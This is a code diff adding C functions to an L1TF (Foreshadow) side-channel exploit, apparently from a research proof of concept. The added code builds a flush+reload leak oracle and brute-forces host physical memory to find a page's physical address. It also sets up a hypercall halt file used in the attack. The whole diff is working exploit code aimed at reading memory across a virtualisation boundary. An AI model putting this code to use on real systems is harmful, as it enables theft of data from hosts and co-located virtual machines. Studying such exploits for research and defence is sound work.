@@ -593,3 +593,87 @@ int l1tf_main(int argc, char *argv[argc]) {
           name, name);
   exit(1);
 }
+
+////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////
+
+static __attribute__((aligned(PAGE_SIZE))) two_byte_reload_buffer rbuf16;
+static leak_addr_t leak_addr;
+static int halt_counter = 1;
+static int fd_halt = -1;
+
+static int l1tf_oracle16_touch(void *p, uintptr_t pa, int nr_tries) {
+  l1tf_leak_buffer_modify(&leak_addr, pa);
+  uint16_t magic = *(uint16_t *)p;
+
+  int hits = 0;
+  for (int i = 0; i < nr_tries; i++) {
+    if (--halt_counter <= 0) {
+      halt_counter = 4500;
+      for (int r = 0; r < 2; r++)
+        assert(write(fd_halt, NULL, 0) == 0);
+    }
+    *(volatile char *)p;
+    lfence();
+    flush(1, rbuf16[magic]);
+    asm_l1tf_leak_2_highest_bytes(leak_addr.leak+(pa & 0xfff), rbuf16);
+    ssize_t value = reload(1, rbuf16[magic], THRESHOLD);
+    hits += value != -1;
+  }
+
+  return hits;
+}
+
+uintptr_t l1tf_find_page_pa(void *p)
+{
+  const int verbose = 1;
+
+  uintptr_t real_pa = helper_find_page_pa(p);
+  if (verbose) printf("l1tf_find_page_pa: the real pa is at %10lx\n", real_pa);
+
+  uint64_t t_start = clock_read();
+
+  *(uint64_t *)p = rand64();
+
+
+  for (int run = 0; run < 100; run++) {
+    uintptr_t start = 0; uintptr_t end = HOST_MEMORY_SIZE;
+    // uintptr_t start = real_pa-512*1024*1024; uintptr_t end = real_pa+HUGE_PAGE_SIZE;
+    for (uintptr_t pa = start; pa < end; pa += PAGE_SIZE) {
+      if (verbose) if (pa % (16*1024*1024) == 0) {
+        printf("l1tf_find_page_pa: run %3d  |  pa  %12lx", run, pa);
+        fflush(stdout);
+        printf("\33[2K\r");
+      }
+
+      int off;
+      for (off = 0; off < 8; off += 2) {
+        char *q = (char *)p + off;
+        uintptr_t pa_q = pa + off;
+        int hits = l1tf_oracle16_touch(q, pa_q, 3);
+        if (!hits)
+          break;
+        if (verbose) printf("l1tf_find_page_pa: run %3d  | va %14p  |  pa %12lx  |  hits %4d\n", run, q, pa_q, hits);
+      }
+      if (off == 8) {
+        if (verbose) {
+          double time = (clock_read()-t_start)/1000000000.0;
+          uintptr_t len = (pa-start) + run*(end-start);
+          printf("l1tf_find_page_pa: found pa %lx in %.1f sec (%.1f MB/s)\n", pa, time, len/time / (1024*1024));
+        }
+        return pa;
+      }
+    }
+  }
+  return -1;
+}
+
+void l1tf_init(void)
+{
+  initialize_pteditor_lib();
+  memset(rbuf16, 0x42, sizeof(rbuf16));
+  leak_addr = l1tf_leak_buffer_create();
+  fd_halt = open("/proc/hypercall/halt", O_WRONLY);
+  assert(fd_halt > 0);
+}
